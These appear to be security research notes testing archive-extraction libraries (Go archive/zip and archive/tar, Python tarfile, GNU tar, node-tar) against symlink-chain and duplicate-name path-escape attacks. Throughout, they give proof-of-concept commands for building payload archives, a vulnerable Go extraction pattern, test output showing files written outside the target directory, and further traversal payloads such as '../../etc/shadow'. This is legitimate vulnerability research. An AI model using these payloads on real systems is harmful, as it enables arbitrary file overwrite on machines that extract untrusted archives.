# ZIP/TAR Security Research - Extension Notes

## Research Goal
Extend archive-alchemist research by finding NEW vulnerabilities in real-world extraction libraries/tools.

---

## FINDINGS SUMMARY

### FINDING 1: Go `archive/zip` + `archive/tar` — Symlink-to-Parent Directory Escape (Arbitrary File Write)

**Severity**: HIGH
**Affected**: Go standard library `archive/zip` and `archive/tar` (tested Go 1.22)
**Attack**: Two-entry archive where entry #1 is a symlink pointing to a parent/absolute directory, and entry #2 is a regular file whose path traverses through the symlink.

**Why this is novel**: Individual filenames contain NO `../` path traversal sequences. The second entry's filename (`escape/tmp/evil.txt`) passes typical path traversal validation. The attack relies on the symlink being processed first, creating a filesystem junction that the second entry follows.

**Proof of Concept (ZIP)**:
```bash
# Create the payload
./archive-alchemist.py payload.zip add escape --symlink "../../../../../../"
./archive-alchemist.py payload.zip add escape/tmp/evil.txt --content "PAYLOAD"

# Go extractor follows symlink and writes to /tmp/evil.txt
```

**Proof of Concept (TAR)**:
```bash
# Symlink directory to /tmp, then write through it
./archive-alchemist.py payload.tar add subdir --symlink "/tmp"
./archive-alchemist.py payload.tar add subdir/evil.txt --content "PAYLOAD"

# Go extractor creates symlink, then writes file through it to /tmp/evil.txt
```

**Root Cause**: Go's `archive/zip` and `archive/tar` libraries expose symlink information but provide NO safe extraction mechanism. The common extraction pattern:
```go
target := filepath.Join(outputDir, f.Name)
os.MkdirAll(filepath.Dir(target), 0755)
os.Create(target)  // follows symlink!
```
...blindly follows symlinks when creating files. `filepath.Join` does NOT resolve symlinks.

**Docker test output (Go archive/zip)**:
```
Entry: escape mode=Lrwxr-xr-x isdir=false
  Symlink -> ../../../../../../ (err=<nil>)
Entry: escape/tmp/evil_via_symlink.txt mode=-rw-r--r-- isdir=false
  Wrote 25 bytes to /tmp/out/escape/tmp/evil_via_symlink.txt
!!! VULNERABLE: /tmp/evil_via_symlink.txt = ESCAPED_VIA_SYMLINK_CHAIN
```

**Docker test output (Go archive/tar)**:
```
Entry: subdir type=50 link=/tmp -> target=/tmp/out/subdir
  Created symlink: <nil>
Entry: subdir/symlink_chain_evil.txt type=48 link= -> target=/tmp/out/subdir/symlink_chain_evil.txt
  Wrote 21 bytes
!!! VULNERABLE: /tmp/symlink_chain_evil.txt = SYMLINK_CHAIN_PAYLOAD
```

---

### FINDING 2: Python `tarfile` (3.12) Default Extraction — Symlink Chain Escape

**Severity**: MEDIUM-HIGH
**Affected**: Python 3.12 (and 3.13) `tarfile.extractall()` with default settings
**Attack**: Same symlink chain pattern as Finding 1, but targeting Python.

**Key insight**: Python 3.12 added extraction filters (`filter='data'`, `filter='tar'`), but the DEFAULT behavior (no filter argument) is still the legacy permissive mode that follows symlinks. A deprecation warning is emitted, but the extraction proceeds unsafely. Python 3.14 will change the default.

**This means**: ANY Python application using `tarfile.extractall(path)` without explicitly passing `filter='data'` or `filter='tar'` is VULNERABLE on Python ≤3.13.

**Docker test output (Python 3.12, default)**:
```
DeprecationWarning: Python 3.14 will, by default, filter extracted tar archives...
Members:
  subdir type=b'2' link=/tmp size=0
  subdir/symlink_chain_evil.txt type=b'0' link= size=21
Extract OK (default filter)
!!! VULNERABLE (default): /tmp/symlink_chain_evil.txt = 'SYMLINK_CHAIN_PAYLOAD'
```

**Filter behavior**:
- `filter=None` (explicit legacy) → VULNERABLE
- Default (no filter arg) → VULNERABLE (with deprecation warning)
- `filter='tar'` → SAFE (detects OutsideDestinationError)
- `filter='data'` → SAFE (blocks absolute symlinks)

---

### FINDING 3: Python `tarfile` — Symlink + Duplicate Filename Write-Through

**Severity**: MEDIUM-HIGH
**Affected**: Python 3.12 `tarfile.extractall()` with `filter=None` or default
**Attack**: TAR archive with two entries sharing the same name: first a symlink to a target path, then a regular file. Python extracts the symlink first, then writes the file content THROUGH the symlink to the target location.

**Docker test output**:
```
Member: config type=b'2' link=/tmp/evil_target.txt size=0
Member: config type=b'0' link= size=31
Extract OK (filter=None)
/tmp/evil_target.txt content after: 'PAYLOAD_WRITTEN_THROUGH_SYMLINK'
!!! VULNERABLE: Content was modified through symlink!
```

---

### FINDING 4: Go `archive/tar` — Symlink + Duplicate Filename Write-Through

**Severity**: HIGH
**Affected**: Go 1.22 `archive/tar`
**Attack**: Same as Finding 3, targeting Go.

**Docker test output**:
```
Entry: config type=50 link=/tmp/evil_target.txt
Entry: config type=48 link=
/tmp/evil_target.txt = "PAYLOAD_WRITTEN_THROUGH_SYMLINK"
!!! VULNERABLE: symlink write-through!
```

---

## NOT VULNERABLE (Tested Safe)

| Extractor | Attack | Result |
|---|---|---|
| GNU tar 1.34 | Symlink chain | SAFE - refused to write through symlink |
| GNU tar 1.34 | Symlink+dupe | SAFE - symlink survived but content NOT written through |
| Python tarfile `filter='data'` | Symlink chain | SAFE - AbsoluteLinkError |
| Python tarfile `filter='tar'` | Symlink chain | SAFE - OutsideDestinationError |
| Node.js `tar` npm package | Symlink chain | SAFE - sanitized symlink target to relative `tmp` |
| Python `zipfile.extractall()` | Symlink-to-parent | SAFE-ish - creates symlink but crashes on nested file (NotADirectoryError) |

---

## Full Test Matrix (Updated)

| Attack Vector | Python zipfile | Python tarfile (default) | Python tarfile (filter=data) | Go archive/zip | Go archive/tar | GNU tar 1.34 | Node.js tar |
|---|---|---|---|---|---|---|---|
| Symlink chain (dir→abs + nested file) | Crashes (NotADirectoryError) | **VULNERABLE** | SAFE | **VULNERABLE** | **VULNERABLE** | SAFE | SAFE |
| Symlink+Dupe (same name) | N/A | **VULNERABLE** | N/A | N/A | **VULNERABLE** | SAFE | N/A |
| Symlink-to-parent + nested (ZIP) | Crashes | N/A | N/A | **VULNERABLE** | N/A | N/A | N/A |

---

## Attack Vectors Tested (Details)

### 1. Symlink + Duplicate Filename Collision
**Concept**: ZIP/TAR with duplicate filenames: first a symlink, then a regular file. Extractors processing in order create symlink, then write content through it.

**Archives**: `symlink_dupe.zip`, `symlink_dupe.tar`
**Status**: CONFIRMED VULNERABLE (Python tarfile default, Go archive/tar)

### 2. Symlink-to-Parent + Nested File (Two-entry escape)
**Concept**: Entry 1 is symlink `escape → ../../../../../../`. Entry 2 is `escape/tmp/evil.txt`. No individual filename contains `../`, bypassing naive path traversal checks.

**Archives**: `symlink_parent.zip`, `symlink_parent.tar`, `symlink_chain.tar`
**Status**: CONFIRMED VULNERABLE (Go archive/zip, Go archive/tar, Python tarfile default)

### 3. Null Byte in Filename
**Concept**: `safe.txt\x00../../etc/shadow` - C-string truncation confusion.
**Archives**: `null_byte.zip`
**Status**: Not tested beyond creation (lower priority given symlink findings)

### 4. Backslash Path Traversal
**Concept**: `..\..\..\..\tmp\evil.txt`
**Archives**: `backslash.zip`
**Status**: Not tested beyond creation (lower priority)

### 5. Unicode Path Extra Field Mismatch
**Concept**: LFH filename = "safe.txt", Unicode Path = "../../../tmp/evil.txt"
**Archives**: `unicode_path.zip`
**Status**: Created and listed, not tested against extractors yet

### 6. Overlong UTF-8 Path Traversal
**Concept**: Use `\xC0\xAE\xC0\xAE\xC0\xAF` (overlong encoding of `../`)
**Archives**: `overlong_utf8.zip`
**Status**: Created, not tested beyond creation

---

## Experiments Log

### Experiment 1: Craft test archives
**Date**: 2026-03-24
**Action**: Created 14 test archives using archive-alchemist + raw binary crafting
**Result**: SUCCESS - all archives in `research/archives/`

### Experiment 2: TAR CLI (GNU tar 1.34) tests
**Date**: 2026-03-24
**Action**: Tested symlink_chain.tar, symlink_dupe.tar, symlink_parent.tar
**Result**: GNU tar SAFE - blocked symlink-based writes. "Cannot open: Not a directory" for chain attack. Symlink survived but content not written through for dupe attack.

### Experiment 3: Python tarfile (3.12) tests
**Date**: 2026-03-24
**Action**: Tested all symlink attacks with default, filter=None, filter=data, filter=tar
**Result**:
- DEFAULT and filter=None: **VULNERABLE** to all symlink attacks
- filter=data: SAFE (blocks absolute symlinks)
- filter=tar: SAFE (detects outside-destination writes)

### Experiment 4: Go archive/zip and archive/tar (1.22) tests
**Date**: 2026-03-24
**Action**: Tested symlink attacks with naive extraction code
**Result**: **VULNERABLE** to all symlink attacks. No built-in protection mechanism.

### Experiment 5: Node.js tar module tests
**Date**: 2026-03-24
**Action**: Tested symlink_chain.tar with default settings
**Result**: SAFE - node-tar sanitizes symlink targets (converted absolute `/tmp` to relative `tmp`)

### Experiment 6: Python zipfile tests
**Date**: 2026-03-24
**Action**: Tested symlink_parent.zip with extractall()
**Result**: Creates symlink but crashes on nested file (NotADirectoryError). Semi-safe by accident.

---

## Key Takeaway

The **symlink-to-parent + nested file** attack pattern is particularly dangerous because:

1. **No `../` in filenames** — Individual entry names (`escape`, `escape/tmp/evil.txt`) pass typical path traversal filters
2. **Bypasses common security checks** — Validators that scan filenames for `../`, absolute paths, or backslashes see nothing suspicious
3. **Works across formats** — Effective in both ZIP and TAR archives
4. **Widely vulnerable** — Go's standard library has zero protection; Python's default tarfile behavior is vulnerable through 3.13
5. **Two-step attack** — The vulnerability only manifests when both entries are processed in order, making it harder to detect with static analysis of archive contents

## Reproduction

```bash
# Create ZIP payload
./archive-alchemist.py escape.zip add escape --symlink "../../../../../../"
./archive-alchemist.py escape.zip add escape/tmp/evil.txt --content "PWNED"

# Create TAR payload
./archive-alchemist.py escape.tar add subdir --symlink "/tmp"
./archive-alchemist.py escape.tar add subdir/evil.txt --content "PWNED"

# Test against Go (vulnerable)
# Test against Python tarfile without filter (vulnerable)
# Test against GNU tar (safe)
```
